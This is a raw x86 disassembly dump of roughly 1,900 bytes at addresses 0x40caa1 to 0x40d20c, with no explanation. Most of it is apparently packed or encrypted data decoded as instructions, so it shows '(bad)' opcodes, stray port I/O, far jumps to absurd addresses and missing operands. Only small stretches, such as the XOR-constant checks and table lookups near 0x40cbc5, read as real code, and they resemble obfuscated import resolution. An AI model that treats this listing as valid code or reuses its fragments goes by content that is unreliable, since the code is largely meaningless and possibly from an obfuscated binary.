  40caa1:	lahf   
  40caa2:	outs   dx,DWORD PTR ds:[esi]
  40caa3:	mov    ds:0xa8f8b179,eax
  40caa8:	int    0x5
  40caaa:	sbb    dl,ch
  40caac:	pop    edi
  40caad:	push   ss
  40caae:	fdivr  QWORD PTR [edi+0x53d908a2]
  40cab4:	mov    edi,0xe02d095e
  40cab9:	push   edx
  40caba:	out    0x3f,eax
  40cabc:	inc    ebp
  40cabd:	repnz out 0xca,eax
  40cac0:	shr    BYTE PTR [esi],1
  40cac2:	jge    0x40cb23
  40cac4:	nop
  40cac5:	or     bl,BYTE PTR [ebx]
  40cac7:	mov    esi,0xe9fce3bd
  40cacc:	inc    eax
  40cacd:	jp     0x40cab6
  40cacf:	xchg   BYTE PTR [ebp+0x3a],al
  40cad2:	(bad)  
  40cad3:	lods   al,BYTE PTR ds:[esi]
  40cad4:	jmp    DWORD PTR [eax+0x3dfb9ff2]
  40cada:	sub    ecx,DWORD PTR [esi]
  40cadc:	js     0x40cab8
  40cade:	and    eax,0xc1f837fc
  40cae3:	sbb    eax,0xaa4c723b
  40cae8:	mov    al,ds:0x375775e1
  40caed:	neg    ebx
  40caef:	mov    ds:0xc9fb8171,al
  40caf4:	pop    edi
  40caf5:	xor    al,0x99
  40caf7:	addr16 dec esi
  40caf9:	ret    
  40cafa:	xchg   ebp,eax
  40cafb:	mov    cl,0xce
  40cafd:	xor    eax,0x6e675374
  40cb02:	ret    
  40cb03:	mov    cl,0xaf
  40cb05:	pop    es
  40cb06:	fldenv [ebx+0x51]
  40cb09:	inc    ebx
  40cb0a:	inc    ebp
  40cb0b:	push   ss
  40cb0c:	scas   eax,DWORD PTR es:[edi]
  40cb0d:	clc    
  40cb0e:	push   edi
  40cb0f:	push   ss
  40cb10:	push   ebx
  40cb11:	jmp    0x40cb76
  40cb13:	jecxz  0x40cabc
  40cb15:	or     DWORD PTR [edx-0x63bc1df],0xfffffff9
  40cb1c:	cmp    eax,0x770fdeee
  40cb21:	sbb    edi,ebx
  40cb23:	mov    ecx,0xd8284723
  40cb28:	call   0x92fae575
  40cb2d:	mov    DWORD PTR [esi-0x39],ebx
  40cb30:	inc    esi
  40cb31:	mov    WORD PTR [ebp+0x34],?
  40cb34:	mov    ah,0xcf
  40cb36:	bound  edi,QWORD PTR [esi]
  40cb38:	mov    ah,0x41
  40cb3a:	les    esp,FWORD PTR [edi+edi*1]
  40cb3d:	inc    edx
  40cb3e:	or     BYTE PTR [ecx-0x21b317e7],0x72
  40cb45:	pop    ecx
  40cb46:	in     eax,dx
  40cb47:	retf   0x61c
  40cb4a:	outs   dx,BYTE PTR ds:[esi]
  40cb4b:	mov    ds:0xe6a36e75,eax
  40cb50:	xor    eax,0xcdfb8b08
  40cb55:	cmp    al,0xde
  40cb57:	leave  
  40cb58:	jl     0x40cadd
  40cb5a:	je     0x40cb41
  40cb5c:	add    edi,DWORD PTR [ebx+0xeaa7c1d]
  40cb62:	cmc    
  40cb63:	scas   eax,DWORD PTR es:[edi]
  40cb64:	or     eax,DWORD PTR ds:0x71c164cf
  40cb6a:	aad    0x4d
  40cb6c:	gs jge 0x40cb9c
  40cb6f:	gs pop ss
  40cb71:	xor    bl,ch
  40cb73:	fwait
  40cb74:	sahf   
  40cb75:	stos   DWORD PTR es:[edi],eax
  40cb76:	add    eax,0xa484af12
  40cb7b:	push   esp
  40cb7c:	inc    ebp
  40cb7d:	aas    
  40cb7e:	sbb    DWORD PTR [eax+eax*8],esp
  40cb81:	push   ecx
  40cb82:	cmc    
  40cb83:	aas    
  40cb84:	scas   al,BYTE PTR es:[edi]
  40cb85:	and    al,0xb8
  40cb87:	out    0xa3,al
  40cb89:	stos   DWORD PTR es:[edi],eax
  40cb8a:	ds sbb eax,0xe022dba
  40cb90:	stc    
  40cb91:	jmp    0xa170241a
  40cb96:	sbb    ecx,edx
  40cb98:	out    dx,eax
  40cb99:	jns    0x40cb6b
  40cb9b:	pop    ds
  40cb9c:	mov    ah,0xbf
  40cb9e:	xor    BYTE PTR [edx-0x596b8a7a],dl
  40cba4:	adc    ah,BYTE PTR [ebx+esi*1]
  40cba7:	int3   
  40cba8:	add    BYTE PTR [esi],dh
  40cbaa:	rol    BYTE PTR [ecx],1
  40cbac:	fstp   DWORD PTR [ebx+0xd]
  40cbaf:	test   BYTE PTR [esi],dh
  40cbb1:	pop    ebp
  40cbb2:	gs push eax
  40cbb4:	hlt    
  40cbb5:	pop    eax
  40cbb6:	loope  0x40cbde
  40cbb8:	fdecstp 
  40cbba:	xchg   ebp,eax
  40cbbb:	jne    0x40cb54
  40cbbd:	xor    BYTE PTR ds:0xff50e802,cl
  40cbc3:	jne    0x40cb95
  40cbc5:	push   DWORD PTR [ebp+0xc]
  40cbc8:	call   0x410a7f
  40cbcd:	mov    eax,DWORD PTR [ebp-0x4]
  40cbd0:	mov    ecx,DWORD PTR [ebp-0x8]
  40cbd3:	xor    eax,0x7510854
  40cbd8:	add    eax,ebx
  40cbda:	cmp    ecx,eax
  40cbdc:	jne    0x40cbff
  40cbe2:	mov    eax,DWORD PTR [ebp-0x20]
  40cbe5:	inc    edi
  40cbe6:	cmp    edi,eax
  40cbe8:	jb     0x40c413
  40cbee:	jmp    0x40cc0f
  40cbf3:	mov    eax,DWORD PTR [ebp-0x4]
  40cbf6:	xor    eax,esi
  40cbf8:	add    eax,ebx
  40cbfa:	jmp    0x40e33d
  40cbff:	mov    eax,DWORD PTR [ebp-0x2c]
  40cc02:	movzx  eax,WORD PTR [eax+edi*2]
  40cc06:	mov    ecx,DWORD PTR [ebp-0x14]
  40cc09:	mov    eax,DWORD PTR [ecx+eax*4]
  40cc0c:	mov    DWORD PTR [ebp+0xc],eax
  40cc0f:	mov    eax,DWORD PTR [ebp-0x4]
  40cc12:	mov    ecx,DWORD PTR [ebp-0x8]
  40cc15:	xor    eax,0x7510854
  40cc1a:	add    eax,ebx
  40cc1c:	cmp    ecx,eax
  40cc1e:	jne    0x40cf51
  40cc24:	mov    eax,DWORD PTR [ebp-0x4]
  40cc27:	xor    eax,0x7510854
  40cc2c:	jmp    0x40cbf8
  40cc31:	jmp    0x40cf51
  40cc36:	xchg   BYTE PTR [edi-0x6ff40385],dl
  40cc3c:	adc    DWORD PTR [ebp+0x593a5a78],0x77d9674d
  40cc46:	and    cl,BYTE PTR [ebx+0x7d7d7e7e]
  40cc4c:	jle    0x40cccc
  40cc4e:	cmp    DWORD PTR [ebx-0x3bd4f856],ebp
  40cc54:	das    
  40cc55:	and    al,0xa3
  40cc57:	sar    DWORD PTR [edx+eax*8],0x0
  40cc5b:	nop
  40cc5c:	mov    edi,0xb9dae90c
  40cc61:	sbb    eax,0x49a8c6da
  40cc66:	cmp    DWORD PTR [esi-0x73],ecx
  40cc69:	lea    ebp,[esi-0xc]
  40cc6c:	lods   al,BYTE PTR ds:[esi]
  40cc6d:	arpl   WORD PTR [esi-0x41957903],si
  40cc73:	les    ebx,FWORD PTR [edx-0x4a]
  40cc76:	jbe    0x40cc42
  40cc78:	lea    ecx,[ebp+0x64]
  40cc7b:	inc    ax
  40cc7d:	out    0x31,eax
  40cc7f:	and    DWORD PTR [eax+0x23412791],eax
  40cc85:	xchg   ebp,eax
  40cc86:	bound  esi,QWORD PTR [ebp+0x745bb108]
  40cc8c:	jo     0x40cc5c
  40cc8e:	fisubr DWORD PTR [ebp-0x50]
  40cc91:	sar    DWORD PTR [ebp-0x21],1
  40cc94:	push   ebp
  40cc95:	jns    0x40cd10
  40cc97:	(bad)  
  40cc98:	in     al,0x1d
  40cc9a:	dec    eax
  40cc9b:	inc    edx
  40cc9c:	xchg   DWORD PTR [esi],edi
  40cc9e:	mov    bl,0xb2
  40cca0:	nop
  40cca1:	jmp    0x632e23c4
  40cca6:	frstor ds:0xa478f5b0
  40ccac:	rcl    BYTE PTR [ebx-0x6328519f],1
  40ccb2:	test   al,0xfb
  40ccb4:	mov    ds:0xaad08ac0,al
  40ccb9:	sub    al,0x89
  40ccbb:	and    eax,0x5ef94014
  40ccc0:	mov    DWORD PTR [ebx],esp
  40ccc2:	arpl   WORD PTR [edx],di
  40ccc4:	adc    eax,0x5ebb9a69
  40ccc9:	mov    es,WORD PTR [edx]
  40cccb:	mov    ah,0x66
  40cccd:	(bad)  
  40cccf:	fcom   QWORD PTR [eax-0x13]
  40ccd2:	push   esp
  40ccd3:	mov    ebx,0x5b577d80
  40ccd8:	sbb    esi,edx
  40ccda:	mov    BYTE PTR [esi-0x3d],ah
  40ccdd:	lods   al,BYTE PTR ds:[esi]
  40ccde:	mov    cl,0x32
  40cce0:	inc    esi
  40cce1:	mov    ds:0x7918accb,al
  40cce6:	ins    BYTE PTR es:[edi],dx
  40cce7:	imul   edi,DWORD PTR ds:0x63cec77f,0x61
  40ccee:	jg     0x40cd25
  40ccf0:	(bad)  
  40ccf1:	cdq    
  40ccf2:	dec    edx
  40ccf3:	enter  0x1bad,0x0
  40ccf7:	out    0xa,eax
  40ccf9:	push   cs
  40ccfa:	pop    edi
  40ccfb:	scas   eax,DWORD PTR es:[edi]
  40ccfc:	ds mov esi,0x749f331a
  40cd02:	fiadd  WORD PTR [ebx+0x5a42029a]
  40cd08:	in     al,0x6f
  40cd0a:	loope  0x40cd71
  40cd0c:	mov    ds:0x2c2ac418,al
  40cd11:	mov    cl,0x2
  40cd13:	ret    0x59b2
  40cd16:	jmp    0xcf91:0xf8603a01
  40cd1d:	enter  0x16a1,0xd4
  40cd21:	dec    esi
  40cd22:	pop    ecx
  40cd23:	js     0x40cd9a
  40cd25:	push   ss
  40cd26:	sbb    eax,eax
  40cd28:	test   al,0xd6
  40cd2a:	xchg   ebp,eax
  40cd2b:	adc    eax,0x8359be85
  40cd30:	clc    
  40cd31:	clc    
  40cd32:	pop    edx
  40cd33:	(bad)  
  40cd34:	out    dx,al
  40cd35:	mov    WORD PTR [esi],es
  40cd37:	mov    al,ds:0xf581941e
  40cd3c:	sbb    eax,0xf6cf804d
  40cd41:	push   ecx
  40cd42:	scas   eax,DWORD PTR es:[edi]
  40cd43:	stos   DWORD PTR es:[edi],eax
  40cd44:	(bad)  
  40cd45:	lods   eax,DWORD PTR ds:[esi]
  40cd46:	or     DWORD PTR [ebx-0x45fb0bcf],0x7f
  40cd4d:	fnstcw WORD PTR [ebx+0x26f848ae]
  40cd53:	or     DWORD PTR [eax+0x38],0x10
  40cd57:	or     eax,0xf50412fa
  40cd5c:	and    eax,0x314c08e7
  40cd61:	inc    ebx
  40cd62:	xchg   ebp,esi
  40cd64:	shr    BYTE PTR [edi],0x77
  40cd67:	lds    eax,FWORD PTR [ecx+0x58]
  40cd6a:	fnstsw WORD PTR [esi+0x4179b16]
  40cd70:	icebp  
  40cd71:	jmp    0x40cdb5
  40cd73:	and    DWORD PTR [eax-0x5b],esi
  40cd76:	inc    edi
  40cd77:	push   edx
  40cd78:	std    
  40cd79:	or     DWORD PTR [ebp-0xd3b723d],esp
  40cd7f:	les    edx,FWORD PTR gs:[edi+0x65]
  40cd83:	xchg   edx,eax
  40cd84:	inc    ecx
  40cd85:	das    
  40cd86:	jmp    0x40cd97
  40cd88:	or     al,0x94
  40cd8a:	jecxz  0x40cd92
  40cd8c:	loop   0x40cdb1
  40cd8e:	sub    eax,0x855d9540
  40cd93:	fdivrp st(4),st
  40cd95:	jbe    0x40ce08
  40cd97:	stos   BYTE PTR es:[edi],al
  40cd98:	in     eax,dx
  40cd99:	shr    DWORD PTR [ebp+0x2e],1
  40cd9c:	or     bl,BYTE PTR [edi+0x10d334e3]
  40cda2:	jo     0x40cd84
  40cda4:	std    
  40cda5:	xchg   edx,eax
  40cda6:	lahf   
  40cda7:	daa    
  40cda8:	cs or  cl,dh
  40cdab:	xchg   edx,eax
  40cdac:	fadd   DWORD PTR [ebp+eiz*2-0x69dcd0f1]
  40cdb3:	add    bl,cl
  40cdb5:	pop    ebp
  40cdb6:	hlt    
  40cdb7:	mov    cl,0xc9
  40cdb9:	inc    edi
  40cdba:	std    
  40cdbb:	je     0x40cd55
  40cdbd:	inc    esp
  40cdbe:	and    DWORD PTR [ebp-0x1c],0x71d4aafd
  40cdc5:	push   eax
  40cdc6:	lea    esi,[ecx+0x474144dd]
  40cdcc:	mov    cl,0x19
  40cdce:	test   ebx,esi
  40cdd0:	adc    eax,0xba5994ed
  40cdd5:	ret    
  40cdd6:	mov    eax,ds:0xd9b24b35
  40cddb:	retf   
  40cddc:	rol    BYTE PTR [edx-0x7c],0x1f
  40cde0:	daa    
  40cde1:	inc    esi
  40cde2:	mov    esi,edx
  40cde4:	rcr    BYTE PTR [edx+ebx*4],1
  40cde7:	ins    DWORD PTR es:[edi],dx
  40cde8:	into   
  40cde9:	je     0x40cdf1
  40cdeb:	pop    ecx
  40cdec:	push   edx
  40cded:	jp     0x40cdd8
  40cdef:	cmp    ecx,DWORD PTR [ecx]
  40cdf1:	xor    dh,BYTE PTR [ebx]
  40cdf3:	leave  
  40cdf4:	xchg   esi,eax
  40cdf5:	sub    ch,dh
  40cdf7:	xchg   BYTE PTR [ecx],dl
  40cdf9:	fst    st(4)
  40cdfb:	or     DWORD PTR [edx+edx*4],edi
  40cdfe:	fmul   st,st(7)
  40ce00:	scas   eax,DWORD PTR es:[edi]
  40ce01:	out    0x4c,al
  40ce03:	mov    dh,0x3b
  40ce05:	call   0x46f08b25
  40ce0a:	es cli 
  40ce0c:	popf   
  40ce0d:	push   esp
  40ce0e:	pop    ecx
  40ce0f:	xor    eax,0x93e772b9
  40ce14:	pop    es
  40ce15:	idiv   BYTE PTR [ebx+0x46]
  40ce18:	sub    bh,BYTE PTR [eax-0x7b]
  40ce1b:	lods   al,BYTE PTR ds:[esi]
  40ce1c:	fisub  WORD PTR [edi-0x31]
  40ce1f:	lods   al,BYTE PTR ds:[esi]
  40ce20:	and    al,0x77
  40ce22:	mov    edi,DWORD PTR gs:[esi+ecx*1+0x4f]
  40ce27:	add    edi,eax
  40ce29:	mov    DWORD PTR [ebx-0x45],ebp
  40ce2c:	hlt    
  40ce2d:	dec    ecx
  40ce2e:	out    dx,eax
  40ce2f:	jbe    0x40ce7b
  40ce31:	out    dx,al
  40ce32:	popa   
  40ce33:	ss or  edi,edx
  40ce36:	cdq    
  40ce37:	inc    edi
  40ce38:	fisttp QWORD PTR [edx+0x2a]
  40ce3b:	sub    esi,DWORD PTR [ebp+edx*4+0x53]
  40ce3f:	xchg   ecx,eax
  40ce40:	fucom  st(1)
  40ce42:	test   eax,0x7a8ea1ae
  40ce47:	repz ror BYTE PTR [eax+edi*4+0x66fc78ea],cl
  40ce4f:	das    
  40ce50:	jo     0x40cea5
  40ce52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce53:	add    BYTE PTR [ebx+0x4c3a6fcf],ah
  40ce59:	popa   
  40ce5a:	sub    dl,ah
  40ce5c:	xor    al,0xe4
  40ce5e:	(bad)  
  40ce5f:	fdiv   st,st(1)
  40ce61:	sti    
  40ce62:	sbb    eax,0xe820a4d9
  40ce67:	and    BYTE PTR [bp+0x2a28],cl
  40ce6c:	inc    eax
  40ce6d:	xchg   BYTE PTR [ecx+ecx*8+0x687b0fc0],dh
  40ce74:	sub    al,BYTE PTR [esi+0x67b6c6e5]
  40ce7a:	and    BYTE PTR [esi-0x30],ah
  40ce7d:	ss clc 
  40ce7f:	mov    eax,ds:0x7c706bf1
  40ce84:	ins    BYTE PTR es:[edi],dx
  40ce85:	cmp    al,0x99
  40ce87:	cmp    al,0xd5
  40ce89:	dec    edi
  40ce8a:	cmp    eax,eax
  40ce8c:	add    ecx,DWORD PTR [ebp-0x55]
  40ce8f:	imul   edi,DWORD PTR [edi+0x1d],0xd2a7e006
  40ce96:	mov    al,ds:0xada761e
  40ce9b:	cmp    ebx,DWORD PTR [edi]
  40ce9d:	xor    dh,dh
  40ce9f:	fwait
  40cea0:	pop    esp
  40cea1:	jmp    0x40ceb3
  40cea3:	iret   
  40cea4:	jns    0x40ce9c
  40cea6:	lock xchg edx,eax
  40cea8:	inc    ebp
  40cea9:	popf   
  40ceaa:	les    ecx,FWORD PTR [ebx]
  40ceac:	add    cl,ch
  40ceae:	fiadd  DWORD PTR [ebp-0x43]
  40ceb1:	les    edi,FWORD PTR [eax+0x1a9046e2]
  40ceb7:	sbb    dl,BYTE PTR ss:[edx-0x46]
  40cebb:	jno    0x40cece
  40cebd:	cmp    dh,BYTE PTR [eax-0x2609f1c]
  40cec3:	ss xchg esp,eax
  40cec5:	shl    cl,0xb6
  40cec8:	xor    edx,eax
  40ceca:	xor    al,0x32
  40cecc:	stc    
  40cecd:	sbb    ebp,DWORD PTR [esi-0x5352b50c]
  40ced3:	xlat   BYTE PTR ds:[ebx]
  40ced4:	enter  0xc596,0x51
  40ced8:	xchg   ecx,eax
  40ced9:	sub    al,0x7f
  40cedb:	fldenv [edx-0x7d561eca]
  40cee1:	cmp    bl,ah
  40cee3:	cmp    cl,BYTE PTR [ebx-0x1c]
  40cee6:	push   esi
  40cee7:	mov    edi,0x88635b25
  40ceec:	jb     0x40cf20
  40ceee:	clc    
  40ceef:	mov    dl,BYTE PTR [esi+0x1395abda]
  40cef5:	(bad)  
  40cef7:	sub    eax,0x9424c87d
  40cefc:	out    dx,eax
  40cefd:	nop
  40cefe:	dec    edx
  40ceff:	test   al,0x70
  40cf01:	imul   ebp,DWORD PTR [edx+edx*2],0x11
  40cf05:	inc    edx
  40cf06:	mov    dh,0xd1
  40cf08:	mov    es,edx
  40cf0a:	cmp    al,0x35
  40cf0c:	fistp  WORD PTR [edx+0x5a]
  40cf0f:	mov    cs,WORD PTR [ebx+0x31]
  40cf12:	daa    
  40cf13:	inc    esi
  40cf14:	test   al,0x2c
  40cf16:	or     DWORD PTR [ebp-0x65f0ae69],0x51
  40cf1d:	js     0x40cf66
  40cf1f:	fsubr  st(5),st
  40cf21:	adc    bh,BYTE PTR [ecx+0x564a1ef]
  40cf27:	bound  edx,QWORD PTR [edx]
  40cf29:	in     al,dx
  40cf2a:	mov    bh,0xe
  40cf2c:	(bad)  
  40cf2d:	(bad)  
  40cf2f:	adc    al,0xbb
  40cf31:	mov    al,ds:0x1e1a139d
  40cf36:	popa   
  40cf37:	jmp    0x2db839d2
  40cf3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf3d:	mov    ebx,DWORD PTR [edi-0x5753c2f6]
  40cf43:	xor    dl,ch
  40cf45:	mov    dl,0x92
  40cf47:	adc    BYTE PTR [ebp-0x68],ch
  40cf4a:	sub    DWORD PTR [ebp-0x54bfc3ce],0x1c
  40cf51:	mov    eax,DWORD PTR [ebp+0xc]
  40cf54:	add    eax,DWORD PTR [ebp+0x8]
  40cf57:	mov    DWORD PTR [ebp-0x10],eax
  40cf5a:	mov    eax,DWORD PTR [ebp-0x1c]
  40cf5d:	test   eax,eax
  40cf5f:	je     0x40dfcf
  40cf65:	mov    DWORD PTR [ebp-0x24],esi
  40cf68:	push   0xb
  40cf6a:	pop    ecx
  40cf6b:	push   0x5
  40cf6d:	dec    ecx
  40cf6e:	jmp    0x40d28e
  40cf73:	test   DWORD PTR [ebx],ebx
  40cf75:	jnp    0x40cfa2
  40cf77:	mov    eax,ds:0x98b1b52b
  40cf7c:	xchg   ecx,eax
  40cf7d:	rcr    dl,0xe5
  40cf80:	mov    al,0x9f
  40cf82:	mul    DWORD PTR [ecx]
  40cf84:	xchg   esi,eax
  40cf85:	jle    0x40d005
  40cf87:	jge    0x40d006
  40cf89:	jle    0x40d009
  40cf8b:	xor    edi,DWORD PTR [ebp+0x17]
  40cf8e:	ins    DWORD PTR es:[edi],dx
  40cf8f:	stos   BYTE PTR es:[edi],al
  40cf90:	cdq    
  40cf91:	sub    DWORD PTR [edx+0x7acc8ff8],0x1e
  40cf98:	push   0xffffff99
  40cf9a:	or     BYTE PTR [ebx+ebx*4-0x7e],al
  40cf9e:	adc    BYTE PTR [ecx+0x1],0xa6
  40cfa2:	mov    esp,0x7c6ac5a0
  40cfa7:	xor    DWORD PTR ds:0x36e4550e,0x6f75b07b
  40cfb1:	inc    esi
  40cfb2:	cld    
  40cfb3:	dec    DWORD PTR [edx+0x2862222d]
  40cfb9:	in     eax,0x4e
  40cfbb:	mov    WORD PTR [ebp+0x629283b1],?
  40cfc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cfc2:	ins    BYTE PTR es:[edi],dx
  40cfc3:	jmp    0xd82a:0x289f9212
  40cfca:	dec    ecx
  40cfcb:	arpl   WORD PTR [edx-0x95d6818],cx
  40cfd1:	jbe    0x40cfd7
  40cfd3:	cdq    
  40cfd4:	(bad)
  40cfd7:	das    
  40cfd8:	inc    ebp
  40cfd9:	cwde   
  40cfda:	aad    0xb6
  40cfdc:	mov    cl,0x39
  40cfde:	test   BYTE PTR es:[ecx-0x5a371825],ah
  40cfe5:	inc    ebp
  40cfe6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cfe7:	repz enter 0xf204,0x99
  40cfec:	jne    0x40cfe7
  40cfee:	jl     0x40cf88
  40cff0:	add    esp,DWORD PTR [ecx]
  40cff2:	inc    ebx
  40cff3:	xchg   edx,eax
  40cff4:	in     al,0x4b
  40cff6:	stos   DWORD PTR es:[edi],eax
  40cff7:	xchg   esi,eax
  40cff8:	push   ebx
  40cff9:	into   
  40cffa:	int3   
  40cffb:	jge    0x40cfe9
  40cffd:	push   cs
  40cffe:	push   esi
  40cfff:	push   ebx
  40d000:	mov    ch,al
  40d002:	pusha  
  40d003:	mov    ebp,0xf4cef242
  40d008:	pop    DWORD PTR [ecx+0x63ab2614]
  40d00e:	mov    bh,0xb2
  40d010:	and    eax,0x96173048
  40d015:	xchg   esp,eax
  40d016:	leave  
  40d017:	inc    edi
  40d018:	lods   eax,DWORD PTR ds:[esi]
  40d019:	(bad)  
  40d01a:	xchg   ebp,eax
  40d01b:	jle    0x40d022
  40d01d:	xchg   DWORD PTR [ebp+0x4f],edi
  40d020:	cwde   
  40d021:	fstp   TBYTE PTR [edi+0x12]
  40d024:	hlt    
  40d025:	sar    BYTE PTR [eax],0x96
  40d028:	xlat   BYTE PTR ds:[ebx]
  40d029:	cwde   
  40d02a:	and    al,bh
  40d02c:	gs mov al,0xa8
  40d02f:	sbb    ah,dl
  40d031:	inc    edx
  40d032:	je     0x40cff5
  40d034:	jae    0x40d084
  40d036:	jns    0x40d0b0
  40d038:	mov    al,0x42
  40d03a:	enter  0x52f2,0x4f
  40d03e:	stos   DWORD PTR es:[edi],eax
  40d03f:	inc    edx
  40d040:	aas    
  40d041:	inc    edx
  40d042:	lahf   
  40d043:	imul   ecx,DWORD PTR ds:[ebp+0x1d1b2466],0xffffffc4
  40d04b:	call   0x330:0x2d179a90
  40d052:	int3   
  40d053:	gs mov ah,0xd8
  40d056:	les    esp,FWORD PTR [ebp+0x53ae1d6a]
  40d05c:	jmp    0x7b088ee4
  40d061:	lahf   
  40d062:	out    0x1,al
  40d064:	je     0x40d099
  40d066:	mov    edi,0x1ceb7377
  40d06b:	xlat   BYTE PTR ds:[ebx]
  40d06c:	mov    esi,0xa32fdf86
  40d071:	adc    DWORD PTR [edx+0x6c],ebp
  40d074:	adc    bl,al
  40d076:	xchg   edx,eax
  40d077:	int3   
  40d078:	in     al,0x67
  40d07a:	mov    ebx,0x50e116e9
  40d07f:	(bad)  
  40d080:	push   cs
  40d081:	fiadd  WORD PTR [ebx+0x2d]
  40d084:	mov    esi,0xcbd5eacd
  40d089:	std    
  40d08a:	test   eax,0x705f7cb4
  40d08f:	out    0x4,al
  40d091:	sahf   
  40d092:	mov    eax,ds:0x421c9efd
  40d097:	lods   eax,DWORD PTR ds:[esi]
  40d098:	lods   eax,DWORD PTR ds:[esi]
  40d099:	cmp    esi,esp
  40d09b:	or     esi,edi
  40d09d:	sub    ah,BYTE PTR [esi-0x39]
  40d0a0:	jle    0x40d11c
  40d0a2:	scas   al,BYTE PTR es:[edi]
  40d0a3:	shl    BYTE PTR [eax],0xea
  40d0a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d0a7:	mov    BYTE PTR [edx-0x6d],ah
  40d0aa:	faddp  st(4),st
  40d0ac:	std    
  40d0ad:	push   ds
  40d0ae:	shl    BYTE PTR [ebx-0x7eeb60c0],cl
  40d0b4:	inc    edi
  40d0b5:	pop    edi
  40d0b6:	jg     0x778ec053
  40d0bc:	xor    BYTE PTR [ebx+0x7e64c433],bl
  40d0c2:	fcomp  DWORD PTR [edi+0x43b44126]
  40d0c8:	mov    dh,0xe1
  40d0ca:	cmp    esi,DWORD PTR [eax+0xa38045c]
  40d0d0:	fld    TBYTE PTR [ebp+0x534a8157]
  40d0d6:	retf   0x931e
  40d0d9:	pop    esp
  40d0da:	sub    eax,0x436d049
  40d0df:	xor    eax,0x4b3f7440
  40d0e4:	in     al,0xf
  40d0e6:	and    DWORD PTR [bp+si-0x4f],ebx
  40d0ea:	and    DWORD PTR [edx-0x39],esp
  40d0ed:	mov    WORD PTR [esi+0x62],cs
  40d0f0:	sbb    ch,BYTE PTR [edx+0x268854e8]
  40d0f6:	gs cdq 
  40d0f8:	(bad)  
  40d0f9:	fstp   st(1)
  40d0fb:	int3   
  40d0fc:	loopne 0x40d09b
  40d0fe:	xchg   DWORD PTR [ebx],ebp
  40d100:	mov    ecx,0x77795581
  40d105:	xchg   esp,eax
  40d106:	lahf   
  40d107:	mov    dh,0x3c
  40d109:	add    BYTE PTR [esi+0x822955d],ch
  40d10f:	lea    ebx,[ebp-0x5d9d0386]
  40d115:	jmp    0x40d0af
  40d117:	pop    ds
  40d118:	je     0x40d18f
  40d11a:	out    0x7f,al
  40d11c:	out    dx,al
  40d11d:	add    DWORD PTR [ecx],ebp
  40d11f:	mov    ch,BYTE PTR [ecx+0x51]
  40d122:	repnz add DWORD PTR [eax+0x38],edx
  40d126:	dec    edx
  40d127:	dec    esp
  40d128:	adc    DWORD PTR [ebp+0x29],eax
  40d12b:	clc    
  40d12c:	cmp    BYTE PTR [esp+eax*1],dl
  40d12f:	jle    0x40d133
  40d131:	cmp    ebx,DWORD PTR [esi]
  40d133:	push   ds
  40d134:	jne    0x40d0dd
  40d136:	bnd jl 0x40d176
  40d139:	pop    ebx
  40d13a:	mov    ebx,0x30cdfb34
  40d13f:	sub    dh,BYTE PTR [esi-0x5c9a4ec4]
  40d145:	aaa    
  40d146:	ins    BYTE PTR es:[edi],dx
  40d147:	sbb    al,0x0
  40d149:	int    0x14
  40d14b:	cmp    al,0xc2
  40d14d:	loop   0x40d0ff
  40d14f:	cmp    edx,eax
  40d151:	mov    ecx,0x1ecd73fb
  40d156:	repz test BYTE PTR [edx+0x3],0x81
  40d15b:	xchg   DWORD PTR [esi-0x2c2f05a8],ebp
  40d161:	push   ebx
  40d162:	shr    ah,0xf2
  40d165:	inc    eax
  40d166:	btc    eax,edi
  40d169:	rol    BYTE PTR ds:0x77fd07c2,0xb1
  40d170:	js     0x40d186
  40d172:	les    ecx,FWORD PTR [edi-0x8]
  40d175:	ins    DWORD PTR es:[edi],dx
  40d176:	ss sub edi,ecx
  40d179:	cmp    BYTE PTR [ecx-0x41a8194a],0xce
  40d180:	push   edi
  40d181:	add    eax,0x7585a94b
  40d186:	and    al,0x28
  40d188:	mov    bl,dh
  40d18a:	test   BYTE PTR [eax],dh
  40d18c:	inc    edx
  40d18d:	mov    al,ds:0x9b8489ec
  40d192:	pusha  
  40d193:	mov    eax,0xc465d36a
  40d198:	ins    DWORD PTR es:[edi],dx
  40d199:	jmp    FWORD PTR [edx+0x762bafee]
  40d19f:	push   edi
  40d1a0:	sahf   
  40d1a1:	pop    eax
  40d1a2:	or     edx,edi
  40d1a4:	sbb    BYTE PTR [eax],cl
  40d1a6:	shl    DWORD PTR [esi],1
  40d1a8:	inc    ebx
  40d1a9:	xchg   esi,eax
  40d1aa:	ins    DWORD PTR es:[edi],dx
  40d1ab:	scas   al,BYTE PTR es:[edi]
  40d1ac:	stos   BYTE PTR es:[edi],al
  40d1ad:	mov    edi,0x35860e3e
  40d1b2:	sbb    DWORD PTR [edi+0xa],0xffffffb5
  40d1b6:	ja     0x40d1b8
  40d1b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d1b9:	sbb    BYTE PTR [ecx+0x2f],bl
  40d1bc:	fnstenv [edx]
  40d1be:	test   eax,0x7033057b
  40d1c3:	mov    ebx,0x930db53f
  40d1c8:	mov    DWORD PTR [eax],edi
  40d1ca:	adc    BYTE PTR [ebx+0x53b2b699],cl
  40d1d0:	push   0x28821916
  40d1d5:	iret   
  40d1d6:	push   edi
  40d1d7:	push   ds
  40d1d8:	pop    ds
  40d1d9:	dec    eax
  40d1da:	push   ecx
  40d1db:	in     eax,0x40
  40d1dd:	mov    bh,dh
  40d1df:	fwait
  40d1e0:	(bad)  
  40d1e1:	adc    dh,BYTE PTR [ecx-0x41abfe4d]
  40d1e7:	iret   
  40d1e8:	jo     0x40d1d9
  40d1ea:	fwait
  40d1eb:	jp     0x40d1ee
  40d1ed:	jbe    0x40d1d4
  40d1ef:	mov    edi,DWORD PTR [eax]
  40d1f1:	shl    DWORD PTR [esi],0xd6
  40d1f4:	rcr    ebx,1
  40d1f6:	fld1   
  40d1f8:	sbb    ecx,DWORD PTR [ebx]
  40d1fa:	ins    BYTE PTR es:[edi],dx
  40d1fb:	adc    ah,BYTE PTR [ebx-0x1287a350]
  40d201:	fwait
  40d202:	xchg   edi,eax
  40d203:	scas   al,BYTE PTR es:[edi]
  40d204:	sbb    eax,DWORD PTR [eax+ecx*4]
  40d207:	arpl   WORD PTR [ecx+0x56],cx
  40d20a:	fcomip st,st(5)
  40d20c:	ret    0x3575
